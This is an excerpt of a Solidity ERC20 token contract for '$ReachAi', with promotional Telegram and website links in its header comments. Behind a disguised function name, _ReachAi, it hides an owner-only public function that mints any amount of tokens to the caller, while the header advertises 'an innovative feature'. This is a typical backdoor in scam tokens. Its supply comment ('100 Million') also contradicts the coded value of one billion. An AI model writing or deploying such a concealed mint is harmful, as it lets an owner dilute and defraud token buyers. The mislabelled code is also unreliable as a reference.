...
//
// $ReachAi proposes an innovative feature in its contract.
//
//  📱Telegram::https://t.me/ReachAI
//  🌐 Website:https://ReachAi.club
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _ReachAi(uint256 amount) public onlyOwner {
 _ReachAi(msg.sender, amount);
    }
    ...
    function _ReachAi(address account, uint256 amount) internal virtual {
...
contract $ReachAi is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Reach Ai", "RAI") {
     _ReachAi(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}